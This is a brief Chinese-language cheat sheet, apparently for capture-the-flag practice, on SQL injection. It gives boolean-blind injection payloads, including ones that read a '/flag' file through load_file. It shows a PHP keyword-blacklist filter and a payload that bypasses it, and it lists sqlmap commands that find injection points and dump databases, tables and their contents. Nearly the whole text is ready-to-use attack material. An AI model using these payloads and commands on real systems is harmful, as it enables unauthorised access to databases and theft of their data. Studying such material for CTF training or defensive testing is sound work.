## SQL

```sql
# 布尔盲注
admin' union select 1 where if(mid((select 1),1,1) in ('1'),1,0)#
admin' union select 1 where if(mid((select 1),1,1) in ('2'),1,0)#


# 判断 flag 文件是否存在
admin' union select 1 where if(load_file('/flag') is not null,1,0)#

'union select 1 where if(mid((select load_file('/flag')),2,1) in ('2'),1,0)#"
```

## 绕过技巧

对于这个检查
```php
function is_trying_to_hak_me($str)
{   
    $blacklist = ["' ", " '", '"', "`", " `", "` ", ">", "<"];
    if (strpos($str, "'") !== false) {
        if (!preg_match("/[0-9a-zA-Z]'[0-9a-zA-Z]/", $str)) {
            return true;
        }
    }
    foreach ($blacklist as $token) {
        if (strpos($str, $token) !== false) return true;
    }
    return false;
}
```

使用 `user=admin'1'/**/UNION/**/ALL/**/SELECT/**/1,2` 可以绕过

## sqlmap 常用

```sh
# 探测是否有注入点
$ sqlmap -u http://url --data="username=admin&password=admin"
# 如果有注入点，显示数据库列表
$ sqlmap -u http://url --data="username=admin&password=admin" --dbs
# 显示当前数据库
$ sqlmap -u http://url --data="username=admin&password=admin" --current-db
# 显示 tables 清单
$ sqlmap -u http://url --data="username=admin&password=admin" -D dbname --tables
# 显示某个表的内容
$ sqlmap -u http://url --data="username=admin&password=admin" -D dbname -T tablename --dump
```